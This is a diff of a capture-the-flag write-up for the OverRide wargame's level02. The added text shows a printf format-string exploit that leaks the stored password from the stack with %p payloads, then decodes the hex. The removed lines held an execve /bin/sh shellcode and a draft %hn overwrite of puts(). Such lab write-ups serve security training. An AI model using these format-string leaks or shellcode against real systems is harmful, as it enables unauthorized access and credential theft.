@@ -7,36 +7,23 @@
 scp -P 4242 level02@192.168.56.109:level02 binary/
 ```
 
-## printf exploit ?
+## printf exploit
 
-<!-- use printf to overwrite the return of `puts()` with our shellcode ?
+**objective** : use printf to print the pass
 
-shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
+size of the pass : 40\
+40 / 8 = 5\
+We are looking for 5 64bits addresses followed by a null address
 ```
-$ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
+$ python -c 'print "%p " * 50' > /tmp/level02 ; cat /tmp/level02 | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
 ```
-```
-$ scp -P 4242 level02/Ressources/getenv.c  level02@192.168.56.109:/tmp/
-```
-```
-$ cd /tmp
-$ gcc getenv.c
-$ cd -
-/home/users/level02
-$ level02@OverRide:~$ /tmp/a.out
-
-0x7fffffffe822
-```
-- 7FFFFF : 8388607
-- FFE822 : 16771106
-16771106 - 8388603
-8382495
-
-puts() address : 0x0000000000200b5a
-python -c 'print "\x5a\x0b\x20" %8388604x %hn %8382496x %hn"' -->
-
-offset = 22\
-40 / 8 = 5
+so offset = 22
 ```
 level02@OverRide:~$ python -c 'print " %22$p %23$p %24$p %25$p %26$p"' > /tmp/level02 ; cat /tmp/level02 | ./level02 
 ===== [ Secure Access System v1.0 ] =====
@@ -45,7 +32,6 @@ level02@OverRide:~$ python -c 'print " %22$p %23$p %24$p %25$p %26$p"' > /tmp/le
 \**************************************/
 --[ Username: --[ Password: *****************************************
  0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
-level02@OverRide:~$ 
 ```
 
 0x756e505234376848 => 4868373452506e75 = Hh74RPnu\
